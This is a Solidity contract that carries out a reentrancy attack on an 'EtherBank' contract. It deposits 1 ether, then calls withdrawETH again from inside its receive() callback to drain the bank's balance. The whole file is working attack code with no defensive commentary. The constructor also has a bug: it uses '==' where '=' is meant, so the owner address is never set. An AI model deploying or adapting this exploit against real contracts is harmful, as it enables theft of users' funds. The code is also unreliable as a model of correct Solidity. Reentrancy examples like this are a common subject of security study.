// SPDX-License-Identifier: GPL-3.0-or-later 
pragma solidity ^0.8.13;

interface IEtherBank {
    function depositETH() external payable;
    function withdrawETH() external; 
}

contract Attack{
    address payable owner;
    IEtherBank etherbank;

    constructor(address _bank){
        owner == payable(msg.sender);
        etherbank = IEtherBank(_bank);
    }


    function attack() public payable{
        etherbank.depositETH{value: 1 ether}();
        etherbank.withdrawETH();
    }

    receive() external payable{
        if(address(etherbank).balance >= 1){
            etherbank.withdrawETH();
        }
        else{
            (bool success, ) = owner.call{value: address(this).balance}("");
            require(success, "Withdraw failed");

        }
    }

}